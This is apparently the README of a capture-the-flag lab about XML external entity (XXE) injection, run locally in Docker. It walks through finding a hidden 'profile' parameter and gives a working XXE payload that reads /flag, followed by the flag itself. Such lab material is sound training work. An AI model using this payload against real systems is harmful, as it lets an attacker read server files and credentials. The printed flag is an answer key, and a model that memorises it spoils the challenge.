## XXE Challenge
## Run the below commands to get Started after cloning the repo
```
docker-compose up
```
Server will start listening on port 4446.

## Solution

1. On visiting the home page(http://localhost:4446), there is a hint in the source code in the index.html page

```
<!--       Todo: Adding UI Change for loading the profile details uploaded publicly in XML format via query param-->


```
2. User has to use paramminer or similar tool to guess the param which is **profile**.

3. After this, either user can guess the XML format or can search for the publicly XML file whose values are being reflected by default in the siter.

Payload to retreive the content of Flag
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "/flag">
]>

<ProfileDetails>
<name>&xxe;</name>
<age>21</age>
<experience>1</experience>
<country>IN</country>
<location>localhost</location>
<email>test@gmail.com</email>
<phone>12345</phone>
<freelance>Available</freelance>
</ProfileDetails>


```
Current XML Hosted gist Url:
https://gist.githubusercontent.com/p3n7a90n/2aa9e9f71df33da9b47aa64f88a7cd93/raw/62c68828306b9879c4a6274a481d9bc68a7ee178/profile.xml

## Flag
Flag{TuwVuMnFzBeKesam27by_so_you_know_XXE}